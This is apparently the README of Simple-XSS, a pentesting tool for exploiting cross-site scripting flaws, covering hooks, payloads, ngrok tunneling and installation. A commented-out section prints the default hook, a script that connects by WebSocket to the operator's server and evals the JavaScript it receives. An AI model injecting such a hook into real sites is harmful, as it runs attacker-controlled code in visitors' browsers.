# Simple-XSS

<p align="center">
  <img src="resources/images/logo.png"  alt="Simple-XSS logo"/>
</p>

<a href="https://github.com/CrazyProger1/Simple-XSS/releases/download/V0.2/Simple-XSS-Windows-x64.zip"><img alt="GitHub all releases" src="https://img.shields.io/github/downloads/CrazyProger1/Simple-XSS/total"></a>
<a href="https://github.com/CrazyProger1/Simple-XSS/blob/master/LICENSE"><img alt="GitHub" src="https://img.shields.io/github/license/CrazyProger1/Simple-XSS"></a>
<a href="https://github.com/CrazyProger1/Simple-XSS/releases/latest"><img alt="GitHub release (latest by date)" src="https://img.shields.io/github/v/release/CrazyProger1/Simple-XSS"></a>

Simple-XSS is a multi-platform cross-site scripting (XSS) vulnerability exploitation tool for pentesting.

Problems solved by Simple-XSS:

- [x] Easy creatable payloads & hooks
- [x] Support of several payload delivering protocols
- [x] Support of several tunneling services (to deliver payload even without white IP)

**Disclaimer:** This program is provided for educational and research purposes only.
The creator of this program does not condone or support any illegal or malicious activity,
and will not be held responsible for any such actions taken by others who may use this program.
By downloading or using this program, you acknowledge that you are solely responsible for any consequences
that may result from the use of this program.

## Vocabulary

**Hook** - snippet of JS code designed to be injected via XSS on the client side.

**Payload** - a program that will be launched remotely in the client’s browser.

## Usage

### GUI-Guide

[//]: # (> Use `--help` argument to get help.)

[//]: # (![commandline help]&#40;docs/help.png&#41;)

[//]: # ()

[//]: # (### GUI-Guide)

[//]: # ()

[//]: # (Firstly, choose the hook. [Default hook]&#40;hooks/default&#41; is the simplest hook, it is only suitable for forms without XSS)

[//]: # (protection:)

[//]: # ()

[//]: # (![step 1]&#40;docs/step_1.png&#41;)

[//]: # ()

[//]: # (Then, choose the payload. [Hello world payload]&#40;payloads/hello_world&#41; is an example payload, it just alerts "Hello,)

[//]: # (World!":)

[//]: # ()

[//]: # (![step 2]&#40;docs/step_2.png&#41;)

[//]: # ()

[//]: # (Now, lets set up tunneling. Tunneling is needed to make a local server public. You have 2 options:)

[//]: # ()

[//]: # (1&#41; use one of the suggested tunneling apps &#40;now it's only [ngrok]&#40;https://ngrok.com/&#41;&#41;)

[//]: # (2&#41; tunnel ports yourself and pass the public URL of the HTTP tunnel to the program)

[//]: # ()

[//]: # (![step 3]&#40;docs/step_3_1.png&#41;)

[//]: # ()

[//]: # (![step 3]&#40;docs/step_3_2.png&#41;)

[//]: # ()

[//]: # (Finally, you can run the process!)

[//]: # ()

[//]: # (![step 4]&#40;docs/step_4.png&#41;)

[//]: # ()

[//]: # (Now you can copy the hook and start hunting ;D)

[//]: # ()

[//]: # (![step 5]&#40;docs/step_5.png&#41;)

[//]: # ()

[//]: # (To demonstrate the possibilities, we can use site [xss-game.appspot.com]&#40;https://xss-game.appspot.com/&#41;.)

[//]: # (Enter the hook into search form:)

[//]: # ()

[//]: # (![step 6]&#40;docs/step_6.png&#41;)

[//]: # ()

[//]: # (Press "Search". As you can see, we have the alert dialog!)

[//]: # ()

[//]: # (![step 7]&#40;docs/step_7.png&#41;)

[//]: # ()

[//]: # (Also, we have "Hello, World!" in our console:)

[//]: # (![step 8]&#40;docs/step_8.png&#41;)

[//]: # ()

[//]: # (### Hook)

[//]: # ()

[//]: # (> _Hooks folder: [hooks]&#40;hooks&#41;_)

[//]: # ()

[//]: # (**Hook** is an HTML code snippet designed to be embedded in a vulnerable XSS form. It looks like:)

[//]: # ()

[//]: # (```html)

[//]: # ()

[//]: # (<script>c = new WebSocket&#40;'{{environment.public_url}}'&#41;;)

[//]: # (c.onmessage = &#40;e&#41; => eval&#40;e.data&#41;;</script>)

[//]: # (```)

[//]: # ()

[//]: # (**NOTE:** _As you can see here is a built-in variable: {{environment.public_url}}. You can read more about)

[//]: # (this below._)

[//]: # ()

[//]: # (This is a [default]&#40;hooks/default&#41; hook. When it's embedded in the vulnerable form, it downloads the JS)

[//]: # (code &#40;[payload]&#40;#payload&#41;&#41; via)

[//]: # (WebSockets)

[//]: # (protocol from the server and)

[//]: # (executes it using [eval]&#40;https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Global_Objects/eval&#41;.)

[//]: # ()

[//]: # (Hook has the following structure:)

[//]: # ()

[//]: # (```)

[//]: # (|)

[//]: # (+-- hook_folder)

[//]: # (    |)

[//]: # (    +-- hook.html)

[//]: # (    |)

[//]: # (    +-- package.toml)

[//]: # (```)

[//]: # ()

[//]: # (**hook.html** - main file, contains HTML code that can be embedded in vulnerable form.)

[//]: # ()

[//]: # (**package.toml** - metadata file, contains data about hook such as name, description, author and version.)

[//]: # ()

[//]: # (### Payload)

[//]: # ()

[//]: # (> _Payloads folder: [payloads]&#40;payloads&#41;_)

[//]: # ()

[//]: # (**Payload** is an arbitrary JS code that loaded by hook on a vulnerable page and executed)

[//]: # (with [eval]&#40;https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Global_Objects/eval&#41;.)

[//]: # ()

[//]: # (Payload has the following structure:)

[//]: # ()

[//]: # (```)

[//]: # (|)

[//]: # (+-- payload_folder)

[//]: # (    |)

[//]: # (    +-- payload.js)

[//]: # (    |)

[//]: # (    +-- package.toml)

[//]: # (    |)

[//]: # (    +-- init.py)

[//]: # (```)

[//]: # ()

[//]: # (**payload.js** - main file, contains arbitrary JS code.)

[//]: # ()

[//]: # (**package.toml** - metadata file, contains data about payload such as name, description, author and version.)

[//]: # ()

[//]: # (**init.py** - python file, imported when loading payload. Allows you to interact with the client side of payload)

[//]: # (&#40;payload.js&#41; via WebSockets protocol.)

[//]: # ()

[//]: # (### Templating)

[//]: # ()

[//]: # (**Built-in objects** is an objects passed into hook & payload main files)

[//]: # (using [Jinja]&#40;https://jinja.palletsprojects.com/&#41;)

[//]: # (templating engine. It contains additional information that may be needed when loading a hook or payload.)

[//]: # ()

[//]: # (#### Environment)

[//]: # ()

[//]: # (- **public_url** - public address of WebSocket server)

[//]: # ()

[//]: # (#### Metadata)

[//]: # ()

[//]: # (**package** - hook or payload)

[//]: # ()

[//]: # (- **name** - name of package)

[//]: # (- **author** - package author)

[//]: # (- **version** - version of package)

[//]: # (- **description** - package description)

[//]: # ()

[//]: # (If you need to use some variable, just use such construction: {{object.variable}}.)

[//]: # (For example:)

[//]: # ()

[//]: # (```)

[//]: # (alert&#40;'{{metadata.name}} - V{{metadata.version}}'&#41;)

[//]: # (```)

[//]: # ()

[//]: # (The provided payload code snippet will display an alert dialog showcasing the name and version of the payload.)

## Interface

> _Thanks to the use of the [Python Flet framework](https://flet.dev/), the application works equally well both in the
browser and in the graphical interface._

### Graphical

### WEB

### Command-Line

## Warning

In favor of ease of use and expanded capabilities, we had to sacrifice backward compatibility between versions 0.2 and
0.3. The features of the previous version are retained and expanded, but older versions of hook & payload will not work.

## Installation

**Note:** _make sure you have installed [Python 3.11](https://www.python.org/downloads/release/python-3115/)_

First you need to clone the repository:

```commandline
git clone https://github.com/CrazyProger1/Simple-XSS
```

Then go to the folder & install the requirements:

**For Window:**

```commandline
cd Simple-XSS
pip install -r requirements/windows.txt
```

**For Linux:**

```commandline
cd Simple-XSS
pip install -r  requirements/linux.txt
```

And finally you can launch it:

```commandline
python main.py
```

## License

Simple-XSS is released under the MIT License. See the bundled [LICENSE](LICENSE) file for details.
